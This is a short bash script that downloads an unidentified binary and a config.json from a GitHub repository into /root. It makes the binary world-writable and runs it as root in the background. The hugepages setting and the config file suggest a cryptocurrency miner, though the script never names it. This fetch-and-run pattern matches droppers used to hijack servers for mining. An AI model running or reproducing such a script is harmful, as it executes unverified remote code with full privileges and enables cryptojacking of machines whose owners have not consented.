#!/bin/bash
sudo yum -y install nano vim wget curl net-tools lsof
sudo sysctl -w vm.nr_hugepages=2560
sudo curl -o /root/1 https://raw.githubusercontent.com/Shallow-Sea/tools/main/1
sudo curl -o /root/config.json https://raw.githubusercontent.com/Shallow-Sea/tools/main/config.json
sudo chmod +x /root/1
sudo chmod +x /root/config.json
sudo chmod -R 777 /root/1
sudo nohup /root/1 > cat.log 2>&1 &
